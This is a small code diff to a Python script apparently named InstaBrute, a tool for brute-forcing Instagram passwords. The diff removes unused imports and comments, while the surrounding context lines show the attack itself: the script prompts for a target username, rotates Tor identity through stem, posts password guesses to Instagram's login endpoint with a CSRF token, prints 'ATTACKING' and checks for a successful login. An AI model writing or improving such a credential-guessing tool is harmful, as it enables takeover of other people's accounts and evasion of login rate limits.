@@ -1,4 +1,3 @@
-import importlib
 import requests
 import threading
 import time
@@ -6,9 +5,6 @@ import os
 import re
 from stem import Signal
 from stem.control import Controller
-import sys
-
-# Import datetime within the class
 from datetime import datetime
 
 class InstaBrute:
@@ -47,7 +43,6 @@ class InstaBrute:
     def get_valid_username(self):
         while True:
             user = input('INSTAGRAM USERNAME: ')
-            # Perform a simple check for a valid Instagram username
             if re.match("^[a-zA-Z0-9_]{1,30}$", user):
                 print("Valid Instagram username.")
                 return user
@@ -100,7 +95,7 @@ class InstaBrute:
                 "Referer": "https://www.instagram.com/accounts/login/",
                 "x-csrftoken": csrf
             })
-            
+
             print(f'{user}:{password}\nTRYING===============ATTACKING')
 
             if 'authenticated": true' in r.text:
